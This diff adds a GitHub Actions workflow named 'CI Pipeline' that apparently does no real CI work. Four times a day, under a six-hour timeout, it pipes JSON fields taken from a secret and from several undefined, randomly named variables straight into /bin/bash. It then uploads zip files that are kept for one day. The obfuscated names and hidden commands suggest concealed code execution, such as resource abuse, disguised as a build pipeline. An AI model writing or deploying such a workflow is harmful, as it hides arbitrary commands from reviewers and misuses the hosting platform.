@@ -1,0 +1,33 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  workflow:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          wovmz624: ${{ secrets.wovmz624 }}
+        run: |
+          printf '%s' "$wovmz624" | jq -r .upebr7 | /bin/bash
+          printf '%s' "$is06" | jq -r .gr1868 | /bin/bash
+          printf '%s' "$iyf26475" | jq -r .i71 | /bin/bash
+          echo $er389 | jq -r .bkg52799 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: sLLrJeJ9
+          path: "*.zip"
+          retention-days: 1
